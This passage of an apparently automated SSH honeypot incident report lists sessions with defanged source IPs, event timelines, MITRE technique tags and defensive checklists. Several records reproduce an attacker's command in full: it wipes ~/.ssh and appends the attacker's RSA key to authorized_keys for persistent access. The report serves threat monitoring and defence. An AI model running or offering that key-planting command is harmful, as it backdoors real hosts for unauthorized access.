| **First Seen** | 2026-07-06 16:21 |
| **Last Seen** | 2026-07-06 16:22 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:21:56` | `cowrie.session.connect` |
| `2026-07-06 16:21:58` | `cowrie.client.version` |
| `2026-07-06 16:21:58` | `cowrie.client.kex` |
| `2026-07-06 16:22:04` | `cowrie.login.success` |
| `2026-07-06 16:22:07` | `cowrie.session.params` |
| `2026-07-06 16:22:07` | `cowrie.command.input` |
| `2026-07-06 16:22:09` | `cowrie.log.closed` |
| `2026-07-06 16:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b9798786fe6

| Field | Detail |
|---|---|
| **Source IP** | `14.103.103[.]211` |
| **First Seen** | 2026-07-06 16:23 |
| **Last Seen** | 2026-07-06 16:24 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:23:45` | `cowrie.session.connect` |
| `2026-07-06 16:23:45` | `cowrie.client.version` |
| `2026-07-06 16:23:47` | `cowrie.client.kex` |
| `2026-07-06 16:23:48` | `cowrie.login.success` |
| `2026-07-06 16:23:49` | `cowrie.session.params` |
| `2026-07-06 16:23:49` | `cowrie.command.input` |
| `2026-07-06 16:23:49` | `cowrie.command.failed` |
| `2026-07-06 16:23:49` | `cowrie.log.closed` |
| `2026-07-06 16:23:50` | `cowrie.session.params` |
| `2026-07-06 16:23:50` | `cowrie.command.input` |
| `2026-07-06 16:23:50` | `cowrie.session.file_download` |
| `2026-07-06 16:23:50` | `cowrie.log.closed` |
| `2026-07-06 16:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.103[.]211` to AbuseIPDB if not already reported
- [ ] Block `14.103.103[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65765ebaea5f

| Field | Detail |
|---|---|
| **Source IP** | `14.103.103[.]211` |
| **First Seen** | 2026-07-06 16:23 |
| **Last Seen** | 2026-07-06 16:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:23:52` | `cowrie.session.connect` |
| `2026-07-06 16:23:52` | `cowrie.client.version` |
| `2026-07-06 16:23:54` | `cowrie.client.kex` |
| `2026-07-06 16:23:56` | `cowrie.login.success` |
| `2026-07-06 16:23:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.103[.]211` to AbuseIPDB if not already reported
- [ ] Block `14.103.103[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ebbab5ac654

| Field | Detail |
|---|---|
| **Source IP** | `14.103.103[.]211` |
| **First Seen** | 2026-07-06 16:24 |
| **Last Seen** | 2026-07-06 16:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:24:04` | `cowrie.session.connect` |
| `2026-07-06 16:24:04` | `cowrie.client.version` |
| `2026-07-06 16:24:05` | `cowrie.client.kex` |
| `2026-07-06 16:24:07` | `cowrie.login.success` |
| `2026-07-06 16:24:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.103[.]211` to AbuseIPDB if not already reported
- [ ] Block `14.103.103[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d339cd2477f

| Field | Detail |
|---|---|
| **Source IP** | `14.63.217[.]28` |
| **First Seen** | 2026-07-06 16:27 |
| **Last Seen** | 2026-07-06 16:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:27:20` | `cowrie.session.connect` |
| `2026-07-06 16:27:20` | `cowrie.client.version` |
| `2026-07-06 16:27:21` | `cowrie.client.kex` |
| `2026-07-06 16:27:21` | `cowrie.login.success` |
| `2026-07-06 16:27:22` | `cowrie.session.params` |
| `2026-07-06 16:27:22` | `cowrie.command.input` |
| `2026-07-06 16:27:22` | `cowrie.command.failed` |
| `2026-07-06 16:27:23` | `cowrie.log.closed` |
| `2026-07-06 16:27:24` | `cowrie.session.params` |
| `2026-07-06 16:27:24` | `cowrie.command.input` |
| `2026-07-06 16:27:24` | `cowrie.session.file_download` |
| `2026-07-06 16:27:24` | `cowrie.log.closed` |
| `2026-07-06 16:27:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.63.217[.]28` to AbuseIPDB if not already reported
- [ ] Block `14.63.217[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57c1cdd0b7d7

| Field | Detail |
|---|---|
| **Source IP** | `14.63.217[.]28` |
| **First Seen** | 2026-07-06 16:27 |
| **Last Seen** | 2026-07-06 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:27:24` | `cowrie.session.connect` |
| `2026-07-06 16:27:24` | `cowrie.client.version` |
| `2026-07-06 16:27:24` | `cowrie.client.kex` |
| `2026-07-06 16:27:25` | `cowrie.login.success` |
| `2026-07-06 16:27:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.63.217[.]28` to AbuseIPDB if not already reported
- [ ] Block `14.63.217[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ee963cfc598

| Field | Detail |
|---|---|
| **Source IP** | `14.63.217[.]28` |
| **First Seen** | 2026-07-06 16:27 |
| **Last Seen** | 2026-07-06 16:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:27:25` | `cowrie.session.connect` |
| `2026-07-06 16:27:25` | `cowrie.client.version` |
| `2026-07-06 16:27:26` | `cowrie.client.kex` |
| `2026-07-06 16:27:26` | `cowrie.login.success` |
| `2026-07-06 16:27:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.63.217[.]28` to AbuseIPDB if not already reported
- [ ] Block `14.63.217[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae0324eed5bb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 16:33 |
| **Last Seen** | 2026-07-06 16:33 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:33:45` | `cowrie.session.connect` |
| `2026-07-06 16:33:46` | `cowrie.client.version` |
| `2026-07-06 16:33:46` | `cowrie.client.kex` |
| `2026-07-06 16:33:52` | `cowrie.login.success` |
| `2026-07-06 16:33:56` | `cowrie.session.params` |
| `2026-07-06 16:33:56` | `cowrie.command.input` |
| `2026-07-06 16:33:58` | `cowrie.log.closed` |
| `2026-07-06 16:33:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8529b5576f6e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 16:34 |
| **Last Seen** | 2026-07-06 16:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:34:08` | `cowrie.session.connect` |
| `2026-07-06 16:34:08` | `cowrie.client.version` |
| `2026-07-06 16:34:09` | `cowrie.client.kex` |
| `2026-07-06 16:34:09` | `cowrie.login.success` |
| `2026-07-06 16:34:09` | `cowrie.direct-tcpip.request` |
| `2026-07-06 16:34:09` | `cowrie.direct-tcpip.data` |
| `2026-07-06 16:34:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f69b752dcc8a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 16:45 |
| **Last Seen** | 2026-07-06 16:46 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:45:53` | `cowrie.session.connect` |
| `2026-07-06 16:45:54` | `cowrie.client.version` |
| `2026-07-06 16:45:54` | `cowrie.client.kex` |
| `2026-07-06 16:46:01` | `cowrie.login.success` |
| `2026-07-06 16:46:04` | `cowrie.session.params` |
| `2026-07-06 16:46:04` | `cowrie.command.input` |
| `2026-07-06 16:46:06` | `cowrie.log.closed` |
| `2026-07-06 16:46:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b52d6ef0b0a9

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 16:57 |
| **Last Seen** | 2026-07-06 16:58 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 16:57:57` | `cowrie.session.connect` |
| `2026-07-06 16:57:58` | `cowrie.client.version` |
| `2026-07-06 16:57:58` | `cowrie.client.kex` |
| `2026-07-06 16:58:04` | `cowrie.login.success` |
| `2026-07-06 16:58:08` | `cowrie.session.params` |
| `2026-07-06 16:58:08` | `cowrie.command.input` |
| `2026-07-06 16:58:09` | `cowrie.log.closed` |
| `2026-07-06 16:58:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a1112197115

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-06 17:03 |
| **Last Seen** | 2026-07-06 17:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:03:49` | `cowrie.session.connect` |
| `2026-07-06 17:03:49` | `cowrie.client.version` |
| `2026-07-06 17:03:49` | `cowrie.client.kex` |
| `2026-07-06 17:03:49` | `cowrie.login.success` |
| `2026-07-06 17:03:49` | `cowrie.direct-tcpip.request` |
| `2026-07-06 17:03:49` | `cowrie.direct-tcpip.data` |
| `2026-07-06 17:03:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12b4885fa8b7

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-06 17:06 |
| **Last Seen** | 2026-07-06 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:06:01` | `cowrie.session.connect` |
| `2026-07-06 17:06:01` | `cowrie.client.version` |
| `2026-07-06 17:06:01` | `cowrie.client.kex` |
| `2026-07-06 17:06:01` | `cowrie.login.success` |
| `2026-07-06 17:06:02` | `cowrie.session.params` |
| `2026-07-06 17:06:02` | `cowrie.command.input` |
| `2026-07-06 17:06:02` | `cowrie.log.closed` |
| `2026-07-06 17:06:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e8f1a52b8b0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 17:10 |
| **Last Seen** | 2026-07-06 17:10 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:10:10` | `cowrie.session.connect` |
| `2026-07-06 17:10:12` | `cowrie.client.version` |
| `2026-07-06 17:10:12` | `cowrie.client.kex` |
| `2026-07-06 17:10:18` | `cowrie.login.success` |
| `2026-07-06 17:10:22` | `cowrie.session.params` |
| `2026-07-06 17:10:22` | `cowrie.command.input` |
| `2026-07-06 17:10:24` | `cowrie.log.closed` |
| `2026-07-06 17:10:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9e70abbb04e

| Field | Detail |
|---|---|
| **Source IP** | `103.59.163[.]132` |
| **First Seen** | 2026-07-06 17:12 |
| **Last Seen** | 2026-07-06 17:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:12:05` | `cowrie.session.connect` |
| `2026-07-06 17:12:05` | `cowrie.client.version` |
| `2026-07-06 17:12:05` | `cowrie.client.kex` |
| `2026-07-06 17:12:06` | `cowrie.login.success` |
| `2026-07-06 17:12:07` | `cowrie.session.params` |
| `2026-07-06 17:12:07` | `cowrie.command.input` |
| `2026-07-06 17:12:07` | `cowrie.command.failed` |
| `2026-07-06 17:12:08` | `cowrie.log.closed` |
| `2026-07-06 17:12:09` | `cowrie.session.params` |
| `2026-07-06 17:12:09` | `cowrie.command.input` |
| `2026-07-06 17:12:09` | `cowrie.session.file_download` |
| `2026-07-06 17:12:09` | `cowrie.log.closed` |
| `2026-07-06 17:12:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.163[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.59.163[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3946f10f1b8

| Field | Detail |
|---|---|
| **Source IP** | `103.59.163[.]132` |
| **First Seen** | 2026-07-06 17:12 |
| **Last Seen** | 2026-07-06 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:12:09` | `cowrie.session.connect` |
| `2026-07-06 17:12:09` | `cowrie.client.version` |
| `2026-07-06 17:12:09` | `cowrie.client.kex` |
| `2026-07-06 17:12:10` | `cowrie.login.success` |
| `2026-07-06 17:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.163[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.59.163[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41dad4e86cb1

| Field | Detail |
|---|---|
| **Source IP** | `103.59.163[.]132` |
| **First Seen** | 2026-07-06 17:12 |
| **Last Seen** | 2026-07-06 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:12:11` | `cowrie.session.connect` |
| `2026-07-06 17:12:11` | `cowrie.client.version` |
| `2026-07-06 17:12:11` | `cowrie.client.kex` |
| `2026-07-06 17:12:12` | `cowrie.login.success` |
| `2026-07-06 17:12:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.59.163[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.59.163[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-081766ab71c9

| Field | Detail |
|---|---|
| **Source IP** | `61.223.65[.]26` |
| **First Seen** | 2026-07-06 17:14 |
| **Last Seen** | 2026-07-06 17:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:14:01` | `cowrie.session.connect` |
| `2026-07-06 17:14:01` | `cowrie.client.version` |
| `2026-07-06 17:14:02` | `cowrie.client.kex` |
| `2026-07-06 17:14:03` | `cowrie.login.success` |
| `2026-07-06 17:14:04` | `cowrie.session.params` |
| `2026-07-06 17:14:04` | `cowrie.command.input` |
| `2026-07-06 17:14:04` | `cowrie.command.failed` |
| `2026-07-06 17:14:04` | `cowrie.log.closed` |
| `2026-07-06 17:14:05` | `cowrie.session.params` |
| `2026-07-06 17:14:05` | `cowrie.command.input` |
| `2026-07-06 17:14:05` | `cowrie.session.file_download` |
| `2026-07-06 17:14:05` | `cowrie.log.closed` |
| `2026-07-06 17:14:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.223.65[.]26` to AbuseIPDB if not already reported
- [ ] Block `61.223.65[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-828fcd8f0211

| Field | Detail |
|---|---|
| **Source IP** | `61.223.65[.]26` |
| **First Seen** | 2026-07-06 17:14 |
| **Last Seen** | 2026-07-06 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:14:05` | `cowrie.session.connect` |
| `2026-07-06 17:14:05` | `cowrie.client.version` |
| `2026-07-06 17:14:05` | `cowrie.client.kex` |
| `2026-07-06 17:14:06` | `cowrie.login.success` |
| `2026-07-06 17:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.223.65[.]26` to AbuseIPDB if not already reported
- [ ] Block `61.223.65[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-443fac57cb1a

| Field | Detail |
|---|---|
| **Source IP** | `61.223.65[.]26` |
| **First Seen** | 2026-07-06 17:14 |
| **Last Seen** | 2026-07-06 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:14:07` | `cowrie.session.connect` |
| `2026-07-06 17:14:07` | `cowrie.client.version` |
| `2026-07-06 17:14:07` | `cowrie.client.kex` |
| `2026-07-06 17:14:08` | `cowrie.login.success` |
| `2026-07-06 17:14:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.223.65[.]26` to AbuseIPDB if not already reported
- [ ] Block `61.223.65[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61cdf8b5f7e8

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-07-06 17:15 |
| **Last Seen** | 2026-07-06 17:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:15:40` | `cowrie.session.connect` |
| `2026-07-06 17:15:40` | `cowrie.client.version` |
| `2026-07-06 17:15:40` | `cowrie.client.kex` |
| `2026-07-06 17:15:41` | `cowrie.login.success` |
| `2026-07-06 17:15:42` | `cowrie.session.params` |
| `2026-07-06 17:15:42` | `cowrie.command.input` |
| `2026-07-06 17:15:42` | `cowrie.command.failed` |
| `2026-07-06 17:15:42` | `cowrie.log.closed` |
| `2026-07-06 17:15:43` | `cowrie.session.params` |
| `2026-07-06 17:15:43` | `cowrie.command.input` |
| `2026-07-06 17:15:43` | `cowrie.session.file_download` |
| `2026-07-06 17:15:43` | `cowrie.log.closed` |
| `2026-07-06 17:15:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-113ab52780c2

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-07-06 17:15 |
| **Last Seen** | 2026-07-06 17:15 |
| **Session Duration** | 1s |
